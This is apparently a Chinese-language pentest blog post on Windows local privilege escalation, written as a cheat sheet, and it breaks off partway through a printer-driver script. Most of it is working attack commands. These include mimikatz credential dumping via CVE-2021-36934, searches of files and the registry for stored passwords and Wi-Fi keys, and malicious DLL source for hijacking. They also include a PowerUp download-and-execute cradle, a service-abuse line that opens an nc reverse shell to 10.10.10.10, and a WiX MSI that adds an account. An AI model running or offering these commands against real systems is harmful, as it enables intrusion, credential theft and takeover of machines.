</ul>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="windows" /><category term="LPE" /><category term="Info gathering" /><summary type="html"><![CDATA[Windows 本地提权 利用导出或查找密码提权 主要思路在于使用 mimikatz 或者从配置文件、注册表项中排查密码。 SAM and SYSTEM files(win10 及以下) 安全帐户管理器 (SAM)，通常是安全帐户管理器，是一个数据库文件。 用户密码以哈希格式存储在注册表配置单元中，作为 LM 哈希或 NTLM 哈希。 该文件位于 %SystemRoot%/system32/config/SAM 中，并安装在 HKLM/SAM 上。 # Usually %SYSTEMROOT% = C:\Windows %SYSTEMROOT%\repair\SAM %SYSTEMROOT%\System32\config\RegBack\SAM %SYSTEMROOT%\System32\config\SAM %SYSTEMROOT%\repair\system %SYSTEMROOT%\System32\config\SYSTEM %SYSTEMROOT%\System32\config\RegBack\system 直接使用 mimikatz 提取即可，无需使用 pwddump HiveNightmare(Windows 10 and 11) 不影响 Server。 CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user 使用 icacls 命令检查漏洞是否存在 C:\Windows\System32&gt; icacls config\SAM config\SAM BUILTIN\Administrators:(I)(F) NT AUTHORITY\SYSTEM:(I)(F) BUILTIN\Users:(I)(RX) &lt;-- this is wrong - regular users should not have read access! Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it. mimikatz&gt; token::whoami /full # List shadow copies available mimikatz&gt; misc::shadowcopies # Extract account from SAM databases mimikatz&gt; lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM # Extract secrets from SECURITY mimikatz&gt; lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY 【漏洞复现】CVE-2021-36934 Windows 提权漏洞复现 - TeamsSix 搜索文件内容中的 password 在 .xml, .ini, .txt .config 等文件中搜索 Password cd C:\ &amp; findstr /SI /M "password" *.xml *.ini *.txt findstr /si password *.xml *.ini *.txt *.config 2&gt;nul &gt;&gt; results.txt findstr /spin "password" *.* 在远程地址例如 SMB Shares 或 SharePoint 搜索 Search passwords in SharePoint: nheiniger/SnaffPoint (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6) # First, retrieve a token ## Method 1: using SnaffPoint binary $token = (.\GetBearerToken.exe https://your.sharepoint.com) ## Method 2: using AADInternals Install-Module AADInternals -Scope CurrentUser Import-Module AADInternals $token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com") # Second, search on Sharepoint ## Method 1: using search strings in ./presets dir .\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token ## Method 2: using search string in command line ### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference .\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config" Search passwords in SMB Shares: SnaffCon/Snaffler 搜索和 password 相关的文件名 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* where /R C:\ user.txt where /R C:\ *.ini 搜索和 password 相关的注册表 REG QUERY HKLM /F "password" /t REG_SZ /S /K REG QUERY HKCU /F "password" /t REG_SZ /S /K reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s 在 unattend.xml 中搜索密码 自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。 Location of the unattend.xml files. C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml C:\Windows\system32\sysprep.inf C:\Windows\system32\sysprep\sysprep.xml Display the content of these files with dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul. Example content &lt;component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64"&gt; &lt;AutoLogon&gt; &lt;Password&gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==&lt;/Password&gt; &lt;Enabled&gt;true&lt;/Enabled&gt; &lt;Username&gt;Administrateur&lt;/Username&gt; &lt;/AutoLogon&gt; &lt;UserAccounts&gt; &lt;LocalAccounts&gt; &lt;LocalAccount wcm:action="add"&gt; &lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt; &lt;Group&gt;administrators;users&lt;/Group&gt; &lt;Name&gt;Administrateur&lt;/Name&gt; &lt;/LocalAccount&gt; &lt;/LocalAccounts&gt; &lt;/UserAccounts&gt; Unattend credentials are stored in base64 and can be decoded manually with base64. $ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d SecretSecurePassword1234* The Metasploit module post/windows/gather/enum_unattend looks for these files. Unattended Installs提权 - zpchcbd - 博客园 IIS Web config 中的密码 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config C:\inetpub\wwwroot\web.config 其他可能存在凭证的文件 %SYSTEMDRIVE%\pagefile.sys %WINDIR%\debug\NetSetup.log %WINDIR%\repair\sam %WINDIR%\repair\system %WINDIR%\repair\software, %WINDIR%\repair\security %WINDIR%\iis6.log %WINDIR%\system32\config\AppEvent.Evt %WINDIR%\system32\config\SecEvent.Evt %WINDIR%\system32\config\default.sav %WINDIR%\system32\config\security.sav %WINDIR%\system32\config\software.sav %WINDIR%\system32\config\system.sav %WINDIR%\system32\CCM\logs\*.log %USERPROFILE%\ntuser.dat %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat %WINDIR%\System32\drivers\etc\hosts C:\ProgramData\Configs\* C:\Program Files\Windows PowerShell\* dir c:*vnc.ini /s /b dir c:*ultravnc.ini /s /b Wifi 密码 Find AP SSID netsh wlan show profile Get Cleartext Pass netsh wlan show profile &lt;SSID&gt; key=clear Oneliner method to extract wifi passwords from all the access point. cls &amp; echo. &amp; for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" &amp; echo.) &amp; @echo on 注意，该一句话仅对英文系统有用，中文系统需要修改匹配字段。 便笺中存放的密码 The sticky notes app stores it’s content in a sqlite db located at C:\Users&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite 服务中存放的密码 Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1 Import-Module path\to\SessionGopher.ps1; Invoke-SessionGopher -AllDomain -o Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss Key Manager 中存放的密码 This software will display its output in a GUI 下面的命令将打开 windows 凭据管理器。 rundll32 keymgr,KRShowKeyMgr Powershell 历史记录中存放的密码 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt cat (Get-PSReadlineOption).HistorySavePath cat (Get-PSReadlineOption).HistorySavePath | sls passw 关闭 ps 历史记录 Set-PSReadlineOption -HistorySaveStyle SaveNothing Powershell Transcript 文件 C:\Users\&lt;USERNAME&gt;\Documents\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt C:\Transcripts\&lt;DATE&gt;\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt 备用数据流（ADS）中的密码 ADS 是添加到新技术文件系统（也称为 NT 文件系统 (NTFS)）中的功能，以提高与 Macintosh 分层文件系统 (HFS) 的可比性。 例如在 notepad 中编辑但未保存到文件的数据。 PS &gt; Get-Item -path flag.txt -Stream * PS &gt; Get-Content -path flag.txt -Stream Flag LAPS Settings Extract HKLM\Software\Policies\Microsoft Services\AdmPwd from Windows Registry. LAPS Enabled: AdmPwdEnabled LAPS Admin Account Name: AdminAccountName LAPS Password Complexity: PasswordComplexity LAPS Password Length: PasswordLength LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled 进程相关提权方式 哪些进程在运行 tasklist /v net start sc query Get-Service Get-Process Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize 哪些进程以 system 权限运行 tasklist /v /fi "username eq system" 如果这些进程所在目录，或加载的 dll 所在目录可写的话，可利用 dll 劫持提权。 Powershell 版本 REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion 枚举已安装程序 已安装程序可作为提权突破点。 Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name 枚举已安装服务 net start wmic service list brief tasklist /SVC 枚举计划任务 schtasks /query /fo LIST 2&gt;nul | findstr TaskName schtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State 枚举自启动应用 wmic startup get caption,command reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 利用服务权限错误提权 以管理员/系统身份运行且文件权限不正确的服务可能导致提权，替换该文件或者劫持 DLL（需要可写权限），然后重启该服务即可。 DLL 劫持 寻找 DLL 劫持利用点 PowerSploit 中的 PowerUp 脚本：Find-PathDLLHijack PowerUp.ps1 Process Monitor : check for “Name Not Found” 编译恶意 DLL For x64 compile with: “x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll” For x86 compile with: “i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll” windows_dll.c 内容 #include &lt;windows.h&gt; BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { if (dwReason == DLL_PROCESS_ATTACH) { system("cmd.exe /k whoami &gt; C:\\Windows\\Temp\\dll.txt"); ExitProcess(0); } return TRUE; } 寻找权限配置不当的 PATH 目录 $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a" $ sc query state=all | findstr "SERVICE_NAME:" &gt;&gt; Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt 在某些情况下，程序可能自主地加载某些路径的 dll，此时就需要逆向特定的应用才可以判断是否可以进行 DLL 劫持。 参考： Powershell 提权框架-Powerup——平心而论，这个提权工具还是很好用的，看后面实战例子 - bonelee - 博客园 PATH 路径可写 下面的命令可以对服务的 path 路进具备的权限进行排查。 $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a" $ sc query state=all | findstr "SERVICE_NAME:" &gt;&gt; Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt 两组命令都可以用，但会生成文件。 或者也可以直接使用 msf 中的 exp： exploit/windows/local/service_permissions windows 10 - CVE-2019-1322 UsoSvc Windows XP SP1 - upnphost 利用 Linux 子系统提权 凭借 root 权限，Windows Subsystem for Linux (WSL) 允许用户在任何端口上创建绑定 shell（无需提升）。 不知道 root 密码？ 没问题，只需将默认用户设置为 root W/.exe –default-user root 即可。 现在启动您的绑定 shell 或反向操作。 Windows 子系统的文件目录也是可以直接查看的： C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\ 利用未加引号的服务路径提权 利用条件： 服务的路径存在无引号且包含空格或其他分隔符。 上级路径可写。 Microsoft Windows 无引号服务路径枚举漏洞。 所有 Windows 服务都有其可执行文件的路径。 如果该路径未加引号且包含空格或其他分隔符，则服务将首先尝试访问父路径中的资源。 例如： For C:\Program Files\something\legit.exe, Windows will try the following paths first: C:\Program.exe C:\Program Files.exe 如果这类路径可写，即可劫持该服务的 exe，如果该服务具备高权限，则可提权。 搜索此类服务。 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name 漏洞利用： Metasploit exploit : exploit/windows/local/trusted_service_path PowerUp exploit # find the vulnerable application C:\&gt; powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks" ... [*] Checking for unquoted service paths... ServiceName : BBSvc Path : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path &lt;HijackPath&gt; ... # automatic exploit Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe" 利用 PATH 拦截提权 利用条件： PATH 路径中存在可写路径 可写文件夹位于包含合法可执行文件的文件夹之前。 示例： ps 中执行如下的命令查看 PATH $env:Path 假设输出为:C:\Program Files\nodejs\;C:\WINDOWS\system32 检查 C:\Program Files\nodejs 文件夹的权限发现可写。 icacls.exe "C:\Program Files\nodejs\" 由于 nodejs 在 system32 之前，因此可以向 nodejs 文件夹中写入 cmd.exe，下次用户再执行 cmd 时，则会执行 nodejs 中的 cmd.exe copy evil-file.exe "C:\Program Files\nodejs\cmd.exe" 利用 Name Pipe 提权 利用服务自身的漏洞或功能 找到存在命名管道的服务，挖掘服务漏洞或可用功能，利用 Name Pipe 操作这些功能或直接利用漏洞获取到高权限。 利用步骤： Find named pipes: [System.IO.Directory]::GetFiles(“\.\pipe") Check named pipes DACL: pipesec.exe Reverse engineering software Send data throught the named pipe : program.exe &gt;\.\pipe\StdOutPipe 2&gt;\.\pipe\StdErrPipe meterpreter 中的 getsystem 有代表性的 EXP 如 meterpreter 中的 getsystem 命令。该技术的核心在于对 ImpersonateNamedPipeClient API 的利用，通过命名管道的服务端进程模仿客户端进程的访问令牌，获取 SYSTEM 权限。当然，想调用它，前提是进程具备 SeImpersonatePrivilege 的权限，而这通常意味着我们已经是 Admin 用户了。 利用细节： 1) getsystem 新建一个线程创建命名管道并等待服务发来的连接 (服务端) 2) getsystem 创建了一个以 SYSTEM 权限运行的 Windows 服务，该服务会向命名管道发起连接 (客户端) 3) 启动该服务，向目标命名管道发起连接 (客户端 -&gt; 服务端) 4) 该进程(服务端)接收连接，调用 ImpersonateNamedPipeClient，从而模仿了 SYSTEM 权限的访问令牌 5) 完成提权过程后，停止并删除该服务 参考 走进Windows中的提权行为-安全客 - 安全资讯平台 PrintSpoofer 命名管道提权的原理大多类似，一般是诱使 system 权限的服务访问我们指定的命名管道。 Windows 的 MS-RPRN 协议用于打印客户机和打印服务器之间的通信，默认情况下启用。同时，Print Spooler 服务的 RPC 接口暴露在命名管道：\.\pipe\spoolss 中，该服务默认开启。 MS-RPRN 协议定义的 RpcRemoteFindFirstPrinterChangeNotificationEx() 调用创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端。 DWORD RpcRemoteFindFirstPrinterChangeNotificationEx( /* [in] */ PRINTER_HANDLE hPrinter, /* [in] */ DWORD fdwFlags, /* [in] */ DWORD fdwOptions, /* [unique][string][in] */ wchar_t *pszLocalMachine, /* [in] */ DWORD dwPrinterLocal, /* [unique][in] */ RPC_V2_NOTIFY_OPTIONS *pOptions) 其中 pszLocalMachine 是指向表示客户端计算机名称的字符串的指针，需要传递一个 UNC 路径，传递 \127.0.0.1 时，服务器会访问 \127.0.0.1\pipe\spoolss，但这个管道已经被系统注册了，并由 NT AUTHORITY\SYSTEM 控制。 那么下一步就是要想办法把这个请求让我们准备好的恶意管道接收。 考虑到 UNC 路径的性质，如果主机名包含 /，它将通过路径检查，但真正连接的时候会转化为 \ 。那么，如果传递一个 \127.0.0.1/pipe/foo，检查时会认为 127.0.0.1/pipe/foo 是一个主机名，随后在连接 named pipe 时会对参数做标准化，于是就会连接 \127.0.0.1\pipe\foo\pipe\spoolss，那么攻击者就可以把主机名改为 \127.0.0.1/pipe/foo 并注册这个 named pipe 从而窃取 client 的 token。 利用工具： itm4n/PrintSpoofer: Abusing impersonation privileges through the “Printer Bug” 利用内核漏洞提权 可参考：https://github.com/SecWiki/windows-kernel-exploits CVE-2021-33739 [Microsoft DWM Core Library Elevation of Privilege Vulnerability] (Windows 10, 20) CVE-2021-1732 [Windows Win32k Elevation of Privilege Vulnerability] (Windows 10, 2019/20H2) CVE-2020-0787 [Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability] (Windows 7/8/10, 2008/2012- 2016/2019) CVE-2020-0796 [A remote code execution vulnerability exists in the way that the Microsoft Server Message Block 3.1.1 (SMBv3)- protocol handles certain requests, aka ‘Windows SMBv3 Client/Server Remote Code Execution Vulnerability’] (Windows 1903/1909) CVE-2019-1458 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016) CVE-2019-0803 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016/2019) CVE-2018-8639 [An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle- objects in memory] (Windows 7/8/10/2008/2012/2016) CVE-2018-1038 [Windows Kernel Elevation of Privilege Vulnerability] (Windows 7 SP1/Windows Server 2008 R2 SP1) CVE-2018-0743 [Windows Subsystem for Linux Elevation of Privilege Vulnerability] (Windows 10 version 1703/Windows 10 version 1709- Windows Server version 1709) CVE-2018-8453 [An elevation of privilege vulnerability in Windows Win32k component] (&gt;= windows 8.1) CVE-2018-8440 [Windows ALPC Elevation of Privilege Vulnerability] (windows 7/8.1/10/2008/2012/2016) MS17-017 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8) CVE-2017-8464 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008) CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008) CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service] (Windows 8.1/Server 2012 R2) CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1) MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP) MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016) MS16-111 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1) MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1) MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012) MS16-034 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012) MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012) MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7) MS16-014 　[K3134228]　　[remote code execution]　　(2008/Vista/7) MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012) MS15-076 　[KB3067505]　　[RPC]　　(2003/2008/7/8/2012) MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012) MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012) MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012) MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2) MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8) MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8) MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003) MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8) MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8) MS14-066 　[KB2992611]　　[Windows Schannel Allowing remote code execution] (VistaSP2/7 SP1/8/Windows 8.1/2003 SP2/2008 SP2/2008 R2- SP1/2012/2012 R2/Windows RT/Windows RT 8.1) MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8) MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP) MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7) MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7) MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8) MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7) MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP) MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP) MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP) MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP) MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista) MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7) MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5) MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista) MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7) MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP) MS10-012 　[KB971468]　　[SMB Client Trans2 stack overflow]　　(Windows 7/2008R2) MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista) MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0) MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista) MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP) MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server 2003/Vista/Server 2008) MS08-066 　[KB956803]　　 [AFD.sys]　　(Windows 2000/XP/Server 2003) MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista) MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000) MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003) MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003) 利用 Microsoft Windows Installer 提权 AlwaysInstallElevated 注册表项错误配置 windows 有一个系统进程 MSIEXEC，用于安装 Windows Installer 安装包，AlwaysInstallElevated 是一个组策略配置，如果启用，那么将允许普通用户以 SYSTEM 权限运行 msi 文件进行安装。如果对方机器恰好开启，我们就可以利用此缺陷提权。 注册表查询, 如果两个查询都返回值 0x1，则为用户和计算机启用了 AlwaysInstallElevated，表明系统容易受到攻击。 # shell reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # ps Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer 漏洞利用： MSF 的 exploit/windows/local/always_install_elevate 模块可以自动完成提权操作，会创建一个随机文件名的 msi 文件，并在提权成功后删除此mai文件，攻击成功会返回 system 权限会话 getuid use exploit/windows/local/always_install_elevated set session 4 run PowerUP 利用 检查注册表的设置： powershell -exec bypass -Command "&amp; {import-module .\powerup.ps1; get-registryalwaysinstallelevated}" 生成新的账户： powershell -exec bypass -Command "&amp; {import-module .\powerup.ps1; write-useraddmsi}" Metasploit可以生成 MSI 类型的载荷，但很容易被 AV/EDR 所检测。所以我们可以手动创建 MSI 包裹文件。 我们可以使用工具 wix (https://github.com/wixtoolset/wix3) 来将包含二进制文件或者任意命令的模板 (https://github.com/KINGSABRI/MSI-AlwaysInstallElevated) 进行打包然后安装。 我们可以直接将要运行的载荷或者命令包含在里面，我们尝试执行添加新用户的命令，模板内容如下： &lt;Wix xmlns="http://schemas.microsoft.com/wix/2006/wi"&gt; &lt;Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="23e23deeqwddeweqwde" Version="0.0.1" Manufacturer="Test1" Language="1033"&gt; &lt;Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package" /&gt; &lt;Media Id='1' /&gt; &lt;Directory Id="TARGETDIR" Name="SourceDir"&gt; &lt;Directory Id="ProgramFilesFolder"&gt; &lt;Directory Id="INSTALLLOCATION" Name="Example"&gt; &lt;Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222" KeyPath="yes"&gt;&lt;/Component&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;Feature Id="DefaultFeature" Level="1"&gt; &lt;ComponentRef Id="ApplicationFiles" /&gt; &lt;/Feature&gt; &lt;CustomAction Id="Shell" Execute="deferred" Directory="TARGETDIR" Impersonate="no" ExeCommand="net user zhi 123.com /add" Return="check" /&gt; &lt;InstallExecuteSequence&gt; &lt;Custom Action="Shell" After="InstallFiles"&gt;&lt;/Custom&gt; &lt;/InstallExecuteSequence&gt; &lt;/Product&gt; &lt;/Wix&gt; 将该模板打包成 .msi 文件： candle zhi.wxs light zhi.wixobj 此时已经生成了zhi.msi文件，运行该文件即可创建用户名为zhi AlwaysInstallElevated提权 本地侦擦与提权 - JFSec - 博客园 利用存在漏洞的驱动提权 条件： 漏洞 存在漏洞的驱动 查看驱动： PS C:\Users\Swissky&gt; driverquery.exe /fo table /si Module Name Display Name Driver Type Link Date ============ ====================== ============= ====================== 1394ohci 1394 OHCI Compliant Ho Kernel 12/10/2006 4:44:38 PM 3ware 3ware Kernel 5/18/2015 6:28:03 PM ACPI Microsoft ACPI Driver Kernel 12/9/1975 6:17:08 AM AcpiDev ACPI Devices driver Kernel 12/7/1993 6:22:19 AM acpiex Microsoft ACPIEx Drive Kernel 3/1/2087 8:53:50 AM acpipagr ACPI Processor Aggrega Kernel 1/24/2081 8:36:36 AM AcpiPmi ACPI Power Meter Drive Kernel 11/19/2006 9:20:15 PM acpitime ACPI Wake Alarm Driver Kernel 2/9/1974 7:10:30 AM ADP80XX ADP80XX Kernel 4/9/2015 4:49:48 PM &lt;SNIP&gt; 对比存在漏洞的驱动： LOLDrivers 利用打印机提权 将 mimikatz 添加为虚拟打印机 Create a Printer $printerName = 'Universal Priv Printer' $system32 = $env:systemroot + '\system32' $drivers = $system32 + '\spool\drivers' $RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName Copy-Item -Force -Path ($system32 + '\mscms.dll') -Destination ($system32 + '\mimispool.dll') Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll' -Destination ($drivers + '\x64\3\mimispool.dll') Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers + '\W32X86\3\mimispool.dll') Add-PrinterDriver -Name 'Generic / Text Only' Add-Printer -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared New-Item -Path ($RegStartPrinter + '\CopyFiles') | 